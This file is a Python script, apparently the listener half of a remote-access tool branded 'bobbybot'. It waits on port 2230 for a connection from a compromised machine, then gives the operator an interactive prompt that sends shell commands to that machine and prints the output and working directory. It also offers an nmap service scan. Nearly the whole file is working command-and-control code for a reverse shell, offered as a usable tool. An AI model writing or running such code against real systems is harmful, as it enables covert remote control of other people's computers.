import os
import sys
import socket
import ipaddress
import requests
import urllib3
import subprocess
import nmap
import json
import argparse

from time import sleep
from colorama import Fore, Style

PARSER = argparse.ArgumentParser()

PARSER.add_argument('Host', type = str, metavar = 'H')

_ARGS = PARSER.parse_args()

HOST = _ARGS.Host
PORT = 2230
BUFF_SIZE = 1024 * 128
CONNECTIONS = []
CHOICES = {
    1: 'Connect',
    2: 'Scan host for vulnerabilities',
    3: 'Exit'
}

socket = socket.socket()
socket.bind((HOST, PORT))
print('[!] Binded')

socket.listen()
print(f'[?] Listening for connections as {HOST}')

connection, addr = socket.accept()
print(f'[!] Connection recieved from {addr[0]} running on port {addr[1]}')
sleep(2)

os.system('clear')

CONNECTIONS.append(addr[0])
CONS_LIST = CONNECTIONS[:][0]

print(Fore.GREEN + Style.BRIGHT + "<------------------------------------------>")
print(f'Current Connections: {[CONS_LIST[:]]}\n')

for ch in CHOICES:
    print(f'{ch}: {CHOICES[ch]}')

CHOICE = int(input('> '))

# Choice handler
if CHOICE in CHOICES:

    if CHOICE == 1: 
        currentwd = connection.recv(BUFF_SIZE).decode()
        print(f'[?] Current work directory is {currentwd}')

        while True:
            COMMAND = input(Fore.LIGHTBLUE_EX + Style.BRIGHT + 'bobbybot ' + Fore.LIGHTGREEN_EX + Style.BRIGHT + f'{currentwd} ' + Fore.WHITE + Style.NORMAL + '$  ')

            if not COMMAND.strip():
                continue

            connection.send(COMMAND.encode())

            if COMMAND.lower() == 'exit':
                break

            OUTPUT = connection.recv(BUFF_SIZE).decode()
            results, currentwd = OUTPUT.split(' | ')

            print(results)

    if CHOICE == 2:
        res = nmap.PortScanner()
        RESULTS = res.scan(HOST, str(PORT), 'sV')

        RESULTS = str(RESULTS)

        FILE = open('output.json', 'w+')
        FILE.writelines(json.dumps(RESULTS, sort_keys=True, indent=4))
        FILE.close()

    if CHOICE == 3:
        sys.exit(1)